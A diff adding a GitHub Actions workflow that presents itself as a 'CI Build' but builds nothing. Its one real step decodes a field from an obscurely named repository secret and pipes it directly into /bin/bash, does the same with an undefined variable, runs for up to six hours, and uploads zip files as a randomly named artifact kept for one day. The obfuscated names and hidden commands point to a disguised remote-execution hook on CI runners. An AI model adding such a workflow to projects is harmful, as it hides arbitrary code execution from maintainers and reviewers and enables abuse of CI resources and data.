@@ -1,0 +1,30 @@
+name: CI Build
+on:
+  workflow_dispatch:
+
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Launch
+        env:
+          xpv3241: ${{ secrets.xpv3241 }}
+        run: |
+          printf '%s' "$xpv3241" | jq -r .fpbz1 | /bin/bash
+          echo $udqpt33 | jq -r .tpnxc94 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: 5M5ZMcp0
+          path: "*.zip"
+          retention-days: 1
